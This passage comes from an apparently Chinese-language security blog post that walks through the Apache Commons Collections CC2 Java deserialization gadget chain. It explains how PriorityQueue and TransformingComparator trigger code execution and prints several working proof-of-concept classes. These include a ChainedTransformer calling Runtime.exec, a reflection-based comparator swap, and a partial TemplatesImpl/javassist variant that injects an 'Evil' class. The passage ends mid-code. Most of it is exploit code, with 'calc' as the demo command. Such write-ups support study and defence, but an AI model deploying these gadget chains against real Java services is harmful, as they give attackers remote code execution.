class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.util.Comparator;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Myqueue</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span>[] list = &#123;<span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>&#125;;<br><span class="hljs-comment">//        PriorityQueue&lt;Integer&gt; queue = new PriorityQueue&lt;Integer&gt;();</span><br>        PriorityQueue&lt;Integer&gt; queue = <span class="hljs-keyword">new</span> PriorityQueue&lt;Integer&gt;(<span class="hljs-keyword">new</span> Comparator&lt;Integer&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(Integer o1, Integer o2)</span> </span>&#123;<br>                <span class="hljs-keyword">return</span> o2 - o1;<br>            &#125;<br>        &#125;);<br>        <span class="hljs-comment">// 输出原始队列</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i : list) &#123;<br>            System.out.print(i + <span class="hljs-string">&quot; &quot;</span>);<br>        &#125;<br>        System.out.println();<br>        <span class="hljs-comment">// 逐个插入优先级队列</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i : list) &#123;<br>            queue.add(i);<br>        &#125;<br>        <span class="hljs-comment">// 逐个输出优先级队列</span><br>        <span class="hljs-keyword">while</span> (!queue.isEmpty()) &#123;<br>            <span class="hljs-keyword">int</span> i = queue.remove();<br>            System.out.print(i + <span class="hljs-string">&quot; &quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>该比较器允许后者操作（插入或删除）的元素比前者大，所以大的元素先输出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">5 7 3 6 2 8 1<br>8 7 6 5 3 2 1<br></code></pre></td></tr></table></figure></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//PriorityQueue.readObject()</span><br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;<br>        s.defaultReadObject();<br>        s.readInt();<br>        queue = <span class="hljs-keyword">new</span> Object[size];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++)<br>            queue[i] = s.readObject();<br>        heapify();<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">heapify</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>            siftDown(i, (E) queue[i]);<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">siftDown</span><span class="hljs-params">(<span class="hljs-keyword">int</span> k, E x)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (comparator != <span class="hljs-keyword">null</span>)<br>        siftDownUsingComparator(k, x);<br>    <span class="hljs-keyword">else</span><br>        siftDownComparable(k, x);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">siftDownUsingComparator</span><span class="hljs-params">(<span class="hljs-keyword">int</span> k, E x)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> half = size &gt;&gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (k &lt; half) &#123;<br>            <span class="hljs-keyword">int</span> child = (k &lt;&lt; <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>            Object c = queue[child];<br>            <span class="hljs-keyword">int</span> right = child + <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (right &lt; size &amp;&amp;<br>                comparator.compare((E) c, (E) queue[right]) &gt; <span class="hljs-number">0</span>)<br>                c = queue[child = right];<br>            <span class="hljs-keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">break</span>;<br>            queue[k] = c;<br>            k = child;<br>        &#125;<br>        queue[k] = x;<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>queue[i]=s.readObject();</code>那么<code>writeObject()</code>写入了对应的内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> java.io.IOException </span>&#123;<br>        s.defaultWriteObject();<br>        s.writeInt(Math.max(<span class="hljs-number">2</span>, size + <span class="hljs-number">1</span>));<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++)<br>            s.writeObject(queue[i]);<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h4><p>从<code>readObject</code>继续往下看，在<code>siftDown()</code>中，我们需要进入<code>siftDownUsingComparator</code>(因为 cc2 中使用了<code>TransformingComparator.compare()</code>来触发，<code>comparator.compare(x, (E) c)</code>判断里的这个调用就符合了)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TransformingComparator</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Transformer&lt;? <span class="hljs-keyword">super</span> I, ? extends O&gt; transformer)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>(transformer, ComparatorUtils.NATURAL_COMPARATOR);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TransformingComparator</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Transformer&lt;? <span class="hljs-keyword">super</span> I, ? extends O&gt; transformer,</span></span><br><span class="hljs-params"><span class="hljs-function">                                  <span class="hljs-keyword">final</span> Comparator&lt;O&gt; decorated)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.decorated = decorated;<br>        <span class="hljs-keyword">this</span>.transformer = transformer;<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(<span class="hljs-keyword">final</span> I obj1, <span class="hljs-keyword">final</span> I obj2)</span> </span>&#123;<br>        <span class="hljs-keyword">final</span> O value1 = <span class="hljs-keyword">this</span>.transformer.transform(obj1);<br>        <span class="hljs-keyword">final</span> O value2 = <span class="hljs-keyword">this</span>.transformer.transform(obj2);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.decorated.compare(value1, value2);<br>    &#125;<br></code></pre></td></tr></table></figure><p>于是在<code>PriorityQueue queue = new PriorityQueue(1,transformingComparator);</code>传入的<code>comparator</code>就为<code>TransformingComparator</code>，调用到<code>comparator.compare(x, (E) c)</code>就能 RCE</p><p>很熟悉，这是来自于 cc1 的后半段链，而且<code>transformer</code>可控，poc 延长如下如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC2;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC2Ez</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;);<br><br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(chainedTransformer);<br><br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(transformingComparator);<br><span class="hljs-comment">//        PriorityQueue queue = new PriorityQueue(1,transformingComparator);</span><br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">2</span>);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先是<code>TransformingComparator</code>处理了<code>chainedTransformer</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">1</span>);<span class="hljs-comment">//为什么传入1，也可以传入PriorityQueue(1,transformingComparator)</span><br>queue.add(<span class="hljs-number">1</span>);<br>queue.add(<span class="hljs-number">2</span>);<span class="hljs-comment">//为什么要添加两个元素</span><br></code></pre></td></tr></table></figure><p>第一个问题，看其构造方法，最后都是<code>this</code>指向一个构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PriorityQueue</span><span class="hljs-params">(<span class="hljs-keyword">int</span> initialCapacity,</span></span><br><span class="hljs-params"><span class="hljs-function">                     Comparator&lt;? <span class="hljs-keyword">super</span> E&gt; comparator)</span> </span>&#123;<br>    <span class="hljs-comment">// Note: This restriction of at least one is not actually needed,</span><br>    <span class="hljs-comment">// but continues for 1.5 compatibility</span><br>    <span class="hljs-keyword">if</span> (initialCapacity &lt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException();<br>    <span class="hljs-keyword">this</span>.queue = <span class="hljs-keyword">new</span> Object[initialCapacity];<br>    <span class="hljs-keyword">this</span>.comparator = comparator;<br>&#125;<br></code></pre></td></tr></table></figure><p>而我们保证一个参数不小于 1，也就是成员变量能赋到值就行，不赋值经过 this 转换后传进去<code>DEFAULT_INITIAL_CAPACITY=11</code>也大于 1</p><p>第二个问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">add</span><span class="hljs-params">(E e)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> offer(e);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">offer</span><span class="hljs-params">(E e)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (e == <span class="hljs-keyword">null</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> NullPointerException();<br>        modCount++;<br>        <span class="hljs-keyword">int</span> i = size;<br>        <span class="hljs-keyword">if</span> (i &gt;= queue.length)<br>            grow(i + <span class="hljs-number">1</span>);<br>        size = i + <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>)<br>            queue[<span class="hljs-number">0</span>] = e;<br>        <span class="hljs-keyword">else</span><br>            siftUp(i, e);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>add</code>两次后<code>size = i + 1;</code>，此时<code>size=2</code>，在<code>heapify#for</code>逻辑才能进去(<code>size &gt;&gt;&gt; 1 = 0</code>)；否则<code>1 &gt;&gt;&gt; 1 = 0</code></p><p>此时能够调用<code>siftDown</code>方法了，根据上面的分析，要调用<code>siftDownUsingComparator</code>，满足非空，此时传入<code>comparator</code>为<code>TransformingComparator</code>即可</p><p>但这个 poc 在编写时会触发，可以规避这个问题：不直接往<code>PriorityQueue</code>构造方法传入<code>TransformingComparator</code>，而是先让其传入其中一个构造方法——置空<code>Comparator</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PriorityQueue</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">this</span>(DEFAULT_INITIAL_CAPACITY, <span class="hljs-keyword">null</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PriorityQueue</span><span class="hljs-params">(<span class="hljs-keyword">int</span> initialCapacity)</span> </span>&#123;<br>    <span class="hljs-keyword">this</span>(initialCapacity, <span class="hljs-keyword">null</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>随后 add 添加两次元素后通过反射替换<code>Comparator</code>为<code>TransformingComparator</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC2;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC2Ez</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;);<br><br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(chainedTransformer);<br><br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue();<br><br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">2</span>);<br><br>        Class clz = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>);<br>        Field comparator = clz.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<span class="hljs-comment">//getField无法获得</span><br>        comparator.setAccessible(<span class="hljs-keyword">true</span>);<br>        comparator.set(queue, transformingComparator);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>有文章提到要在 add 之后才通过反射修改 comparator 的值：add-&gt;offer-&gt;siftUp，此时要保证<code>comparator</code>的值为 null，才能添加元素，否则会出现报错，但我测试没有问题，不知道是否版本问题</p><h3 id="Gadget-1"><a href="#Gadget-1" class="headerlink" title="Gadget"></a>Gadget</h3><p>然而 cc2 用的链仍然与我们的不一致，cc2 使用的是<code>javassist</code>和<code>TemplatesImpl</code></p><p>那么现在需要将<code>TemplatesImpl.newTransformer</code>触发的方式，进一步通过<code>PriorityQueue</code>和<code>TransformingComparator.compare</code>序列化以及<code>InvokerTransformer.transform</code>执行任意代码延长</p><p>poc 如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC2;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC2</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span> <span class="hljs-params">(Object o, String fieldName,Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredField = clz.getDeclaredField(fieldName);<br>            declaredField.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredField.set(o,value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctc = cp.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctc.makeClassInitializer().insertBefore(cmd);<br>        ctc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-keyword">byte</span>[] classbytes = ctc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetclassbytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classbytes&#125;;<br><br>        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br><br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,targetclassbytes);<br><span class="hljs-comment">//        setFieldValue(templatesimpl,&quot;_class&quot;,null);</span><br><span class="hljs-comment">//        setFieldValue(templatesimpl,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><br>        InvokerTransformer newTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">null</span>, 